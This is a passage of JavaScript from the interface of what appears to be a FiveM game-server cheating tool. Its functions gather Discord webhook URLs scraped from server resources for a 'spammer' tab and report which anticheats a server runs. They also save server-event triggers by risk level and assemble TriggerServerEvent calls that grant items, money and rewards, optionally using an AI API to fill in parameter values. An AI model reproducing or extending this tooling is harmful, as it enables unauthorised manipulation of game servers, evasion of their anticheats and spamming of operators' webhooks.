        appState.selectedWebhooks = [];

        if (webhooks.length === 0 && appState.manualWebhooks.length === 0) {
            webhookList.innerHTML = '<p style="color: #9a9aa8; text-align: center; font-size: 12px;">No webhooks found from scan</p>';
            return;
        }

        webhooks.forEach((webhook, index) => {
            const webhookItem = document.createElement('div');
            webhookItem.className = 'webhook-item';
            webhookItem.innerHTML = `
                <input type="checkbox" id="webhook-${index}" data-url="${webhook.url}" data-type="scanned">
                <span class="webhook-url">${webhook.url}</span>
            `;
            
            const checkbox = webhookItem.querySelector('input[type="checkbox"]');
            checkbox.addEventListener('change', (e) => {
                if (e.target.checked) {
                    appState.selectedWebhooks.push(webhook.url);
                    webhookItem.classList.add('selected');
                } else {
                    appState.selectedWebhooks = appState.selectedWebhooks.filter(url => url !== webhook.url);
                    webhookItem.classList.remove('selected');
                }
            });
            
            webhookList.appendChild(webhookItem);
        });

        appState.manualWebhooks.forEach((webhook, index) => {
            const webhookItem = document.createElement('div');
            webhookItem.className = 'webhook-item';
            webhookItem.innerHTML = `
                <input type="checkbox" id="manual-webhook-${index}" data-url="${webhook.url}" data-type="manual">
                <span class="webhook-url">${webhook.url} (Manual)</span>
            `;
            
            const checkbox = webhookItem.querySelector('input[type="checkbox"]');
            checkbox.addEventListener('change', (e) => {
                if (e.target.checked) {
                    appState.selectedWebhooks.push(webhook.url);
                    webhookItem.classList.add('selected');
                } else {
                    appState.selectedWebhooks = appState.selectedWebhooks.filter(url => url !== webhook.url);
                    webhookItem.classList.remove('selected');
                }
            });
            
            webhookList.appendChild(webhookItem);
        });
    } catch (error) {
        console.error('Error updating webhook selection:', error);
    }
}

function updateSelectedWebhooksList() {
    try {
        const container = document.getElementById('selected-webhooks-list');
        if (!container) return;

        container.innerHTML = '';
        
        if (appState.selectedWebhooks.length === 0) {
            container.innerHTML = '<p style="color: #9a9aa8; text-align: center; font-size: 12px;">No webhooks selected</p>';
            return;
        }
        
        appState.selectedWebhooks.forEach((url, index) => {
            const webhookItem = document.createElement('div');
            webhookItem.className = 'selected-webhook-item';

            const isManual = appState.manualWebhooks.includes(url);
            const sourceText = isManual ? ' (Manual)' : ' (Scanned)';
            
            webhookItem.innerHTML = `
                <span class="webhook-url">${url}${sourceText}</span>
                <button class="remove-btn" onclick="removeSelectedWebhook('${url}')">
                    <i class="fas fa-times"></i>
                </button>
            `;
            
            container.appendChild(webhookItem);
        });
    } catch (error) {
        console.error('Error updating selected webhooks list:', error);
    }
}

function addManualWebhooksToSelection() {
    try {
        let addedCount = 0;
        
        appState.manualWebhooks.forEach(url => {
            if (!appState.selectedWebhooks.includes(url)) {
                appState.selectedWebhooks.push(url);
                addedCount++;
            }
        });
        
        if (addedCount > 0) {
            updateSelectedWebhooksList();
            updateSpammerSelectedWebhooks();
            showNotification(`Added ${addedCount} manual webhook(s) to selection`, 'success');
        } else {
            showNotification('All manual webhooks are already selected', 'info');
        }
    } catch (error) {
        console.error('Error adding manual webhooks to selection:', error);
        showNotification('Error adding manual webhooks to selection', 'error');
    }
}

function removeSelectedWebhook(url) {
    try {

        appState.selectedWebhooks = appState.selectedWebhooks.filter(selectedUrl => selectedUrl !== url);

        const checkbox = document.querySelector(`.webhook-checkbox[data-url="${url}"]`);
        if (checkbox) {
            checkbox.checked = false;
        }
        
        updateSelectedWebhooksList();
        updateSpammerSelectedWebhooks();
        showNotification('Webhook removed from selection', 'success');
    } catch (error) {
        console.error('Error removing selected webhook:', error);
    }
}

function toggleWebhookSelection(url) {
    try {
        const isSelected = appState.selectedWebhooks.includes(url);
        
        if (isSelected) {

            appState.selectedWebhooks = appState.selectedWebhooks.filter(selectedUrl => selectedUrl !== url);
            showNotification('Webhook deselected', 'info');
        } else {

            appState.selectedWebhooks.push(url);
            showNotification('Webhook selected', 'success');
        }
        
        updateSpammerSelectedWebhooks();
    } catch (error) {
        console.error('Error toggling webhook selection:', error);
    }
}

function removeWebhook(url) {
    try {

        appState.manualWebhooks = appState.manualWebhooks.filter(webhookUrl => webhookUrl !== url);
        appState.selectedWebhooks = appState.selectedWebhooks.filter(webhookUrl => webhookUrl !== url);
        
        updateManualWebhooksList();
        updateSpammerSelectedWebhooks();
        showNotification('Webhook removed', 'success');
    } catch (error) {
        console.error('Error removing webhook:', error);
    }
}

function selectAllWebhooks() {
    try {

        const checkboxes = document.querySelectorAll('.webhook-checkbox, .spammer-checkbox');
        
        appState.selectedWebhooks = []; // Clear before selecting all

        const allWebhooks = [...new Set([...appState.manualWebhooks, ...(appState.scanResults?.webhooks?.map(w => w.url) || [])])];
        
        allWebhooks.forEach((url) => {
            if (!appState.selectedWebhooks.includes(url)) {
                appState.selectedWebhooks.push(url);
            }
        });

        checkboxes.forEach((checkbox) => {
            const url = checkbox.dataset.url;
            if (appState.selectedWebhooks.includes(url)) {
                checkbox.checked = true;
            }
        });
        
        updateSelectedWebhooksList();
        updateSpammerSelectedWebhooks(); // Update spammer tab display
        showNotification('All webhooks selected', 'success');
    } catch (error) {
        console.error('Error selecting all webhooks:', error);
    }
}

function clearWebhookSelection() {
    try {

        const checkboxes = document.querySelectorAll('.webhook-checkbox, .spammer-checkbox');
        
        checkboxes.forEach((checkbox) => {
            checkbox.checked = false;
        });
        
        appState.selectedWebhooks = [];
        updateSelectedWebhooksList();
        updateSpammerSelectedWebhooks(); // Update spammer tab display
        showNotification('Webhook selection cleared', 'success');
    } catch (error) {
        console.error('Error clearing webhook selection:', error);
    }
}

function applyItemsFilter() {
    const currentFilter = appState.itemsFilter || 'all';
    const searchInput = document.getElementById('search-input');
    const searchTerm = searchInput ? searchInput.value.toLowerCase() : '';
    
    let filteredItems = appState.scanResults.items || [];

    if (currentFilter !== 'all') {
        filteredItems = filteredItems.filter(item => {
            return item.type === currentFilter;
        });
    }

    if (searchTerm) {
        filteredItems = filteredItems.filter(item => 
            item.name.toLowerCase().includes(searchTerm) ||
            item.label.toLowerCase().includes(searchTerm) ||
            (item.resource && item.resource.toLowerCase().includes(searchTerm))
        );
    }
    
    updateItemsTable(filteredItems);
}

function applyKnownTriggersFilter() {

    updateKnownTriggersTable();
}

function updateItemsTable(items = null) {
    try {
        const tbody = document.getElementById('items-tbody');
        if (!tbody) return;

        tbody.innerHTML = '';


        let itemsToShow = items;
        if (!itemsToShow || !Array.isArray(itemsToShow)) {
            itemsToShow = appState.scanResults.items || [];

            const currentFilter = appState.itemsFilter || 'all';
            if (currentFilter !== 'all') {
                itemsToShow = itemsToShow.filter(item => {
                    return item.type === currentFilter;
                });
            }
        }
        
        itemsToShow.forEach((item, index) => {
            const row = document.createElement('tr');

            row.setAttribute('data-item-name', item.name);
            row.setAttribute('data-item-resource', item.resource || 'unknown');

            if (item.imageUrl) {
                row.innerHTML = `
                    <td>
                        <img src="${item.imageUrl}" alt="${item.name}" style="width: 32px; height: 32px; object-fit: contain; border-radius: 4px; border: 1px solid #333;">
                    </td>
                    <td>${item.name}</td>
                    <td>${item.label}</td>
                    <td>
                        <button class="copy-item-btn" data-index="${index}" style="padding: 4px 8px; background: #ededed; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="Copy to Clipboard">
                            <i class="fas fa-copy"></i>
                        </button>
                        <button class="preview-item-btn" data-index="${index}" style="padding: 4px 8px; background: #34d399; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;" title="Open in Preview">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                `;
            } else {

                row.innerHTML = `
                    <td>
                        <div style="width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; background: #2a2a2a; border-radius: 4px; border: 1px solid #333;">
                            <span style="color: #ededed; font-weight: bold; font-size: 14px;">${item.name.charAt(0).toUpperCase()}</span>
                        </div>
                    </td>
                    <td>${item.name}</td>
                    <td>${item.label}</td>
                    <td>
                        <button class="copy-item-btn" data-index="${index}" style="padding: 4px 8px; background: #ededed; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="Copy to Clipboard">
                            <i class="fas fa-copy"></i>
                        </button>
                        <button class="preview-item-btn" data-index="${index}" style="padding: 4px 8px; background: #34d399; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;" title="Open in Preview">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                `;
            }

            const copyBtn = row.querySelector('.copy-item-btn');
            const previewBtn = row.querySelector('.preview-item-btn');
            
            copyBtn.addEventListener('click', () => {
                copyItemName(item.name);
            });
            
            previewBtn.addEventListener('click', () => {
                openItemPreview(item.name, item.resource || 'unknown');
            });
            
            tbody.appendChild(row);
        });
    } catch (error) {
        console.error('Error updating items table:', error);
    }
}

function updateCoordinatesTable(coordinates = null) {
    try {
        const tbody = document.getElementById('coordinates-tbody');
        const emptyState = document.getElementById('coordinates-empty');
        
        if (!tbody) return;

        tbody.innerHTML = '';
        
        const coordinatesToShow = coordinates || appState.scanResults.coordinates;
        
        if (coordinatesToShow.length === 0) {
            if (emptyState) {
                emptyState.style.display = 'flex';
            }
            return;
        }
        
        if (emptyState) {
            emptyState.style.display = 'none';
        }
        
        coordinatesToShow.forEach((coord, index) => {
            const row = document.createElement('tr');

            row.setAttribute('data-coord-coordinates', coord.coordinates);
            row.setAttribute('data-coord-resource', coord.resource);
            row.setAttribute('data-coord-file', coord.file);
            row.setAttribute('data-coord-line', coord.line);
            row.setAttribute('data-coord-x', coord.x);
            row.setAttribute('data-coord-y', coord.y);
            row.setAttribute('data-coord-z', coord.z);
            row.setAttribute('data-coord-w', coord.w);

            let typeColor = '#ededed';
            if (coord.type === 'vec4') {
                typeColor = '#e05572';
            } else if (coord.type === 'array') {
                typeColor = '#e3b341';
            }

            const nearItemInfo = coord.nearItem ? `<br><small style="color: #34d399;">Near: ${coord.nearItem}</small>` : '';
            
            row.innerHTML = `
                <td>
                    <span style="padding: 4px 8px; border-radius: 4px; font-size: 12px; background: ${typeColor}; color: white;">
                        ${coord.type.toUpperCase()}
                    </span>
                </td>
                <td style="font-family: 'Courier New', monospace; font-size: 12px;">
                    ${coord.coordinates}
                    ${nearItemInfo}
                </td>
                <td>${coord.resource}</td>
                <td style="font-size: 12px; color: #9a9aa8;">${coord.file}</td>
                <td>${coord.line}</td>
                <td>
                    <button class="copy-coord-btn" data-index="${index}" style="padding: 4px 8px; background: #ededed; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="Copy Coordinates">
                        <i class="fas fa-copy"></i>
                    </button>
                    <button class="view-coord-btn" data-index="${index}" style="padding: 4px 8px; background: #34d399; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="View in File">
                        <i class="fas fa-eye"></i>
                    </button>
                </td>
            `;

            const copyBtn = row.querySelector('.copy-coord-btn');
            const viewBtn = row.querySelector('.view-coord-btn');
            
            copyBtn.addEventListener('click', () => {
                copyCoordinates(coord.coordinates);
            });
            
            viewBtn.addEventListener('click', () => {
                viewCoordinates(coord.resource, coord.file, coord.line);
            });
            
            tbody.appendChild(row);
        });
    } catch (error) {
        console.error('Error updating coordinates table:', error);
    }
}

function getItemImagePath(item) {
    try {

        if (item.resource && item.resource.toLowerCase().includes('ox_inventory')) {

            const imagePaths = [
                `./ox_inventory/web/build/images/${item.name}.png`,
                `./ox_inventory/web/build/images/${item.name}.jpg`,
                `./ox_inventory/web/build/images/${item.name}.jpeg`,
                `./ox_inventory/web/build/images/${item.name}.webp`,
                `./ox_inventory/web/build/images/${item.name}.gif`,

                `./ox_inventory/web/build/images/${item.name.toUpperCase()}.png`,
                `./ox_inventory/web/build/images/${item.name.toUpperCase()}.jpg`,
                `./ox_inventory/web/build/images/${item.name.toUpperCase()}.jpeg`,
                `./ox_inventory/web/build/images/${item.name.toUpperCase()}.webp`,
                `./ox_inventory/web/build/images/${item.name.toUpperCase()}.gif`
            ];

            return imagePaths[0];
        }

        const genericPaths = [
            `./${item.resource}/images/${item.name}.png`,
            `./${item.resource}/images/${item.name}.jpg`,
            `./${item.resource}/web/images/${item.name}.png`,
            `./${item.resource}/web/images/${item.name}.jpg`,
            `./${item.resource}/html/images/${item.name}.png`,
            `./${item.resource}/html/images/${item.name}.jpg`
        ];
        
        return genericPaths[0];
    } catch (error) {
        console.error('Error getting item image path:', error);
        return `./ox_inventory/web/build/images/${item.name}.png`;
    }
}

function updateAnticheatFromScan(anticheats) {
    try {
        const anticheatStatus = document.getElementById('anticheat-status');
        if (anticheatStatus) {
            const anticheatResults = appState.scanResults.anticheats || [];
            if (anticheatResults.length > 0) {

                const formatted = anticheatResults.map(ac => 
                    `${ac.name} found in ${ac.folder || ac.resource}`
                );
                anticheatStatus.textContent = `Anticheats: ${formatted.join(', ')}`;
            } else {
                anticheatStatus.textContent = 'Anticheat: None detected';
            }
        }
    } catch (error) {
        console.error('Error updating anticheat from scan:', error);
    }
}


function saveTrigger(resource, usage, risk) {
    try {
        const trigger = {
            id: Date.now(),
            resource: resource,
            usage: usage,
            risk: risk,
            dateSaved: new Date().toISOString()
        };
        
        appState.savedTriggers.push(trigger);
        saveTriggersToLocalStorage();
        updateSavedTriggersList();
        updateStats();
        showNotification('Trigger saved', 'success');
    } catch (error) {
        console.error('Error saving trigger:', error);
        showNotification('Error saving trigger', 'error');
    }
}

function showAddTriggerDialog() {
    try {

        const inputDialog = document.createElement('div');
        inputDialog.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;

        const dialogContent = document.createElement('div');
        dialogContent.style.cssText = `
            background: #1a1a1a;
            padding: 30px;
            border-radius: 8px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            min-width: 500px;
            max-width: 600px;
        `;

        dialogContent.innerHTML = `
            <h3 style="color: #ffffff; margin-bottom: 20px; font-size: 18px;">
                <i class="fas fa-plus"></i> Add Trigger Manually
            </h3>
            <div style="margin-bottom: 15px;">
                <label style="display: block; color: #9a9aa8; margin-bottom: 5px; font-size: 12px;">Resource Name:</label>
                <input type="text" id="manual-trigger-resource" placeholder="e.g., esx_ambulancejob" 
                    style="width: 100%; padding: 10px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 4px; color: #ffffff; font-size: 14px;">
            </div>
            <div style="margin-bottom: 15px;">
                <label style="display: block; color: #9a9aa8; margin-bottom: 5px; font-size: 12px;">Trigger Usage:</label>
                <textarea id="manual-trigger-usage" placeholder="e.g., TriggerServerEvent('esx_ambulancejob:revive', playerId)" 
                    style="width: 100%; padding: 10px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 4px; color: #ffffff; font-size: 14px; min-height: 80px; font-family: monospace; resize: vertical;"></textarea>
            </div>
            <div style="margin-bottom: 20px;">
                <label style="display: block; color: #9a9aa8; margin-bottom: 5px; font-size: 12px;">TYPE:</label>
                <select id="manual-trigger-risk" 
                    style="width: 100%; padding: 10px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 4px; color: #ffffff; font-size: 14px;">
                    <option value="low">Low</option>
                    <option value="medium">Medium</option>
                    <option value="high">High</option>
                </select>
            </div>
            <div style="display: flex; gap: 10px; justify-content: flex-end;">
                <button id="manual-trigger-cancel" 
                    style="padding: 10px 20px; background: rgba(255, 255, 255, 0.1); color: #ffffff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px;">
                    Cancel
                </button>
                <button id="manual-trigger-save" 
                    style="padding: 10px 20px; background: #34d399; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 14px;">
                    <i class="fas fa-save"></i> Save
                </button>
            </div>
        `;

        inputDialog.appendChild(dialogContent);
        document.body.appendChild(inputDialog);

        const resourceInput = dialogContent.querySelector('#manual-trigger-resource');
        resourceInput.focus();

        const saveBtn = dialogContent.querySelector('#manual-trigger-save');
        saveBtn.addEventListener('click', () => {
            const resource = resourceInput.value.trim();
            const usage = dialogContent.querySelector('#manual-trigger-usage').value.trim();
            const risk = dialogContent.querySelector('#manual-trigger-risk').value;

            if (!resource || !usage) {
                showNotification('Please fill in all fields', 'error');
                return;
            }

            const existingTrigger = appState.savedTriggers.find(t => t.resource === resource && t.usage === usage);
            if (existingTrigger) {
                showNotification('This trigger is already saved', 'error');
                return;
            }

            saveTrigger(resource, usage, risk);
            document.body.removeChild(inputDialog);
        });

        const cancelBtn = dialogContent.querySelector('#manual-trigger-cancel');
        cancelBtn.addEventListener('click', () => {
            document.body.removeChild(inputDialog);
        });

        inputDialog.addEventListener('click', (e) => {
            if (e.target === inputDialog) {
                document.body.removeChild(inputDialog);
            }
        });

        const handleEscape = (e) => {
            if (e.key === 'Escape') {
                document.body.removeChild(inputDialog);
                document.removeEventListener('keydown', handleEscape);
            }
        };
        document.addEventListener('keydown', handleEscape);
    } catch (error) {
        console.error('Error showing add trigger dialog:', error);
        showNotification('Error opening add trigger dialog', 'error');
    }
}

function copyTrigger(usage) {
    try {

        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(usage);
            showNotification('Trigger copied to clipboard', 'success');
        } else {

            const textArea = document.createElement('textarea');
            textArea.value = usage;
            textArea.style.position = 'fixed';
            textArea.style.left = '-999999px';
            textArea.style.top = '-999999px';
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            
            try {
                document.execCommand('copy');
                showNotification('Trigger copied to clipboard', 'success');
            } catch (err) {
                showNotification('Please copy manually: ' + usage, 'warning');
            }
            
            document.body.removeChild(textArea);
        }
    } catch (error) {
        console.error('Error copying trigger:', error);
        showNotification('Error copying trigger', 'error');
    }
}

function viewTrigger(resource, file, line) {
    try {

        const resourceExplorer = document.querySelector('.resource-explorer');
        if (resourceExplorer) {

            resourceExplorer.scrollIntoView({ behavior: 'smooth' });

            navigateToFileInExplorer(file, resource);
            
            showNotification(`Navigating to ${file} in resource explorer`, 'success');
        } else {
            showNotification(`Viewing trigger: ${resource} in ${file}:${line}`, 'info');
        }
    } catch (error) {
        console.error('Error navigating to trigger file:', error);
        showNotification(`Viewing trigger: ${resource} in ${file}:${line}`, 'info');
    }
}

function transferToEditor(triggerText, resourceName) {
    try {

        switchTab('editor');

        const editorTextarea = document.getElementById('editor-trigger-text');
        if (editorTextarea) {
            editorTextarea.value = triggerText;
            editorTextarea.focus();

            const resourceNameInput = document.getElementById('editor-resource-name');
            if (resourceNameInput && resourceName) {
                resourceNameInput.value = resourceName;
            }
            
            showNotification('Trigger transferred to editor', 'success');
        } else {
            showNotification('Editor not found', 'error');
        }
    } catch (error) {
        console.error('Error transferring to editor:', error);
        showNotification('Error transferring to editor', 'error');
    }
}

async function quickEditTrigger(triggerText, resourceName, filePath, lineNumber) {
    try {

        const triggerFunctionMatch = triggerText.match(/(Trigger(?:Server|Client)?Event)\s*\(/);
        const triggerFunction = triggerFunctionMatch ? triggerFunctionMatch[1] : 'TriggerServerEvent';

        const eventNameMatch = triggerText.match(/\(["']([^"']+)["']/);
        const eventName = eventNameMatch ? eventNameMatch[1] : 'event:name';

        const paramsMatch = triggerText.match(/\(["'][^"']+["']\s*,\s*(.+)\)/);
        const params = paramsMatch ? paramsMatch[1] : '';
        
        let templateParams = '';
        let actualValues = {};

        if (filePath && lineNumber > 0) {
            try {

                console.log('quickEditTrigger: Looking for file:', filePath);
                const fileName = filePath.split('/').pop() || filePath;
                let file = null;

                if (filePath) {
                    file = appState.selectedFiles.find(f => {
                        const relativePath = f.webkitRelativePath || `web_upload/${f.name}`;

                        if (relativePath === filePath) {
                            console.log('quickEditTrigger: Found file by exact match:', relativePath);
                            return true;
                        }

                        if (relativePath.endsWith('/' + filePath) || relativePath.endsWith(filePath)) {
                            console.log('quickEditTrigger: Found file by endsWith match:', relativePath);
                            return true;
                        }
                        return false;
                    });
                }

                if (!file && filePath && filePath.includes('/')) {
                    file = appState.selectedFiles.find(f => {
                        const relativePath = f.webkitRelativePath || `web_upload/${f.name}`;
                        if (relativePath.includes(filePath)) {
                            console.log('quickEditTrigger: Found file by partial match:', relativePath);
                            return true;
                        }
                        return false;
                    });
                }

                if (!file) {
                    file = appState.selectedFiles.find(f => {
                        if (f.name === fileName) {
                            console.log('quickEditTrigger: Found file by filename only:', f.name);
                            return true;
                        }
                        return false;
                    });
                }
                
                if (file && isTextFile(fileName)) {
                    const reader = new FileReader();
                    reader.onerror = function() {
                        console.error('Error reading file:', fileName);

                        buildAndSetTemplate(triggerFunction, eventName, params, resourceName);
                    };
                    reader.onload = async function(e) {
                        try {
                            const content = e.target.result;
                            const lines = content.split('\n');
                            const targetLine = lines[lineNumber - 1] || '';
                            
                            console.log('quickEditTrigger: Reading file, line', lineNumber, 'content:', targetLine.substring(0, 100));


                            let fullTrigger = '';
                            let triggerStartIndex = targetLine.indexOf('Trigger');
                            if (triggerStartIndex === -1) {

                                for (let i = Math.max(0, lineNumber - 2); i < Math.min(lines.length, lineNumber + 2); i++) {
                                    const line = lines[i];
                                    const idx = line.indexOf('Trigger');
                                    if (idx !== -1) {
                                        triggerStartIndex = idx;

                                        fullTrigger = extractCompleteTriggerCall(lines, i);
                                        break;
                                    }
                                }
                            } else {
                                fullTrigger = extractCompleteTriggerCall(lines, lineNumber - 1);
                            }
                            
                            console.log('quickEditTrigger: Extracted trigger:', fullTrigger.substring(0, 200));
                            
                            if (fullTrigger) {

                                const eventNameMatch = fullTrigger.match(/\(["']([^"']+)["']/);
                                const extractedEventName = eventNameMatch ? eventNameMatch[1] : eventName;
                                
                                console.log('quickEditTrigger: Event name:', extractedEventName);

                                const fullParamsMatch = fullTrigger.match(/\(["'][^"']+["']\s*,\s*(.+)\)/);
                                if (fullParamsMatch) {
                                    const actualParams = fullParamsMatch[1];
                                    
                                    console.log('quickEditTrigger: Actual params:', actualParams);

                                    const paramList = parseParameters(actualParams);
                                    
                                    console.log('quickEditTrigger: Parsed params:', paramList);

                                    const context = content;

                                    let aiUsed = false;
                                    const now = Date.now();
                                    const canUseAI = AI_CONFIG.USE_AI_FOR_QUICK_EDIT && AI_CONFIG.ENABLED && AI_CONFIG.API_KEY && 
                                                    (!AI_CONFIG.RATE_LIMITED || now > AI_CONFIG.RATE_LIMIT_UNTIL);
                                    
                                    if (canUseAI) {
                                        try {
                                            showNotification('Analyzing trigger with AI...', 'info');
                                            const aiValues = await analyzeTriggerParametersWithAI(context, fullTrigger, lineNumber, paramList);
                                            if (aiValues && Object.keys(aiValues).length > 0) {
                                                Object.assign(actualValues, aiValues);
                                                console.log('quickEditTrigger: AI extracted values:', aiValues);
                                                aiUsed = true;
                                                AI_CONFIG.RATE_LIMITED = false;
                                            } else {
                                                console.log('quickEditTrigger: AI returned no values, using manual extraction');
                                                extractValuesManually(paramList, context, lineNumber, actualValues);
                                            }
                                        } catch (error) {
                                            console.error('quickEditTrigger: AI analysis failed, using manual extraction:', error);
                                            if (error.message && error.message.includes('402')) {
                                                AI_CONFIG.ENABLED = false;
                                            } else if (error.message && (error.message.includes('429') || error.message.includes('Rate limit'))) {
                                                AI_CONFIG.RATE_LIMITED = true;
                                                AI_CONFIG.RATE_LIMIT_UNTIL = now + 120000;
                                            }
                                            extractValuesManually(paramList, context, lineNumber, actualValues);
                                            }
                                        } else {
                                        if (AI_CONFIG.RATE_LIMITED) {
                                            const remaining = Math.ceil((AI_CONFIG.RATE_LIMIT_UNTIL - now) / 1000);
                                            console.log(`quickEditTrigger: AI rate limited, ${remaining}s remaining`);
                                        }
                                        extractValuesManually(paramList, context, lineNumber, actualValues);
                                    }

                                    const formattedParams = paramList.map((param, index) => {

                                        if (actualValues[index] !== undefined && actualValues[index] !== null) {
                                            const value = actualValues[index];

                                            if (typeof value === 'string') {

                                                const cleanValue = value.replace(/^["']|["']$/g, '');

                                                if (cleanValue.match(/^\d+(\.\d+)?$/)) {
                                                    return cleanValue;
                                                }

                                                return `"${cleanValue}"`;
                                            }
                                            return String(value);
                                        }

                                        const cleanParam = param.trim();
                                        if (cleanParam.match(/^["'][^"']*["']$/)) {
                                            return cleanParam;
                                        }
                                        if (cleanParam.match(/^\d+$/)) {
                                            return cleanParam;
                                        }

                                        if (cleanParam.match(/item|name/i)) {
                                            return '"item"';
                                        }
                                        if (cleanParam.match(/qty|quant|amount|count/i)) {
                                            return '100';
                                        }
                                        if (cleanParam.match(/money|cash|price/i)) {
                                            return '1000';
                                        }
                                        return cleanParam;
                                    });
                                    
                                    templateParams = formattedParams.join(', ');
                                    console.log('quickEditTrigger: Final template params:', templateParams);

                                    const finalEventName = extractedEventName || eventName;
                                    buildAndSetTemplate(triggerFunction, finalEventName, templateParams, resourceName, true, aiUsed);
                                    return;
                                } else {

                                    buildAndSetTemplate(triggerFunction, extractedEventName || eventName, '', resourceName, true);
                                    return;
                                }
                            } else {
                                console.warn('quickEditTrigger: Could not extract trigger from file');

                                buildAndSetTemplate(triggerFunction, eventName, params, resourceName, false);
                            }
                        } catch (error) {
                            console.error('quickEditTrigger: Error processing file content:', error);
                            buildAndSetTemplate(triggerFunction, eventName, params, resourceName, false);
                        }
                    };
                    reader.readAsText(file);
                    return; // Will continue in reader.onload
                } else {
                    console.warn('quickEditTrigger: File not found or not a text file:', filePath, fileName);

                    buildAndSetTemplate(triggerFunction, eventName, params, resourceName, false);
                }
            } catch (error) {
                console.error('Error reading file for quick edit:', error);
            }
        }

        buildAndSetTemplate(triggerFunction, eventName, params, resourceName, false);
    } catch (error) {
        console.error('Error creating quick edit template:', error);
        transferToEditor(triggerText, resourceName);
    }
}

function buildAndSetTemplate(triggerFunction, eventName, templateParams, resourceName, fromFile = false, aiUsed = false) {
    try {
        let finalTemplateParams = '';

        if (typeof templateParams === 'string') {
            finalTemplateParams = templateParams;
        } else if (templateParams) {

            const paramList = parseParameters(templateParams);
            finalTemplateParams = paramList.map((param) => {
                if (param.match(/^["'][^"']*["']$/)) {
                    const content = param.replace(/["']/g, '');
                    if (content.match(/item|weapon|money|cash|bank/i) || content.length < 20) {
                        return '"item"';
                    }
                    return param;
                }
                if (param.match(/^\d+$/)) {
                    return 'quantity';
                }
                if (param.match(/^[a-zA-Z_][a-zA-Z0-9_]*$/)) {
                    if (param.match(/item|name|id/i)) {
                        return '"item"';
                    }
                    if (param.match(/qty|quant|amount|count/i)) {
                        return 'quantity';
                    }
                    return param;
                }
                return param;
            }).join(', ');
        } else {

            if (eventName.match(/item|inventory|give|add|set/i)) {
                finalTemplateParams = '"item", quantity';
            } else if (eventName.match(/money|cash|bank|pay/i)) {
                finalTemplateParams = 'amount';
            }
        }

        let template = '';
        if (finalTemplateParams) {
            template = `${triggerFunction}("${eventName}", ${finalTemplateParams})`;
        } else {
            template = `${triggerFunction}("${eventName}")`;
        }
        
        console.log('buildAndSetTemplate: Final template:', template);

        switchTab('editor');
        const editorTextarea = document.getElementById('editor-trigger-text');
        if (editorTextarea) {
            editorTextarea.value = template;
            editorTextarea.focus();
            const resourceNameInput = document.getElementById('editor-resource-name');
            if (resourceNameInput && resourceName) {
                resourceNameInput.value = resourceName;
            }
            if (aiUsed) {
                showNotification('Quick edit template created with AI-extracted values!', 'success');
            } else if (fromFile) {
                showNotification('Quick edit template created with values from file!', 'success');
            } else {
                showNotification('Quick edit template created - fill in the placeholders!', 'success');
            }
        } else {
            showNotification('Editor not found', 'error');
        }
    } catch (error) {
        console.error('Error building template:', error);
        showNotification('Error creating template', 'error');
    }
}

function parseParameters(params) {
    const paramList = [];
    let currentParam = '';
    let inString = false;
    let stringChar = '';
    let depth = 0;
    
    for (let i = 0; i < params.length; i++) {
        const char = params[i];
        
        if (!inString && (char === '"' || char === "'")) {
            inString = true;
            stringChar = char;
            currentParam += char;
        } else if (inString && char === stringChar && params[i - 1] !== '\\') {
            inString = false;
            currentParam += char;
        } else if (!inString && char === '{') {
            depth++;
            currentParam += char;
        } else if (!inString && char === '}') {
            depth--;
            currentParam += char;
        } else if (!inString && char === '(') {
            depth++;
            currentParam += char;
        } else if (!inString && char === ')') {
            depth--;
            currentParam += char;
        } else if (!inString && depth === 0 && char === ',') {
            paramList.push(currentParam.trim());
            currentParam = '';
        } else {
            currentParam += char;
        }
    }
    
    if (currentParam.trim()) {
        paramList.push(currentParam.trim());
    }
    
    return paramList;
}

function extractCompleteTriggerCall(lines, startLineIndex) {

    let triggerCall = '';
    let parenCount = 0;
    let foundTrigger = false;
    let inString = false;
    let stringChar = '';
    
    for (let i = startLineIndex; i < lines.length && i < startLineIndex + 10; i++) {
        const line = lines[i];
        
        for (let j = 0; j < line.length; j++) {
            const char = line[j];
            
            if (!foundTrigger && line.substring(j).startsWith('Trigger')) {
                foundTrigger = true;
                triggerCall = 'Trigger';
                j += 6; // Skip "Trigger"
                continue;
            }
            
            if (foundTrigger) {
                triggerCall += char;
                
                if (!inString && (char === '"' || char === "'")) {
                    inString = true;
                    stringChar = char;
                } else if (inString && char === stringChar && line[j - 1] !== '\\') {
                    inString = false;
                } else if (!inString && char === '(') {
                    parenCount++;
                } else if (!inString && char === ')') {
                    parenCount--;
                    if (parenCount === 0) {
                        return triggerCall;
                    }
                }
            }
        }
        
        if (foundTrigger && !inString && parenCount === 0) {
            break;
        }
        
        if (foundTrigger && i < lines.length - 1) {
            triggerCall += ' '; // Add space for next line
        }
    }
    
    return triggerCall;
}

function findVariableValue(varName, context, lineNumber) {


    const lines = context.split('\n');

    if (varName.includes('.')) {
        const parts = varName.split('.');
        const tableName = parts[0];
        const fieldName = parts[1];

        const tableValue = findTableFieldValue(tableName, fieldName, context);
        if (tableValue !== null) {
            return tableValue;
        }

        if (fieldName === 'reward' || fieldName === 'basePrice') {
            return '100000.0';
        } else if (fieldName === 'id' || fieldName === 'taskId') {
            return '1';
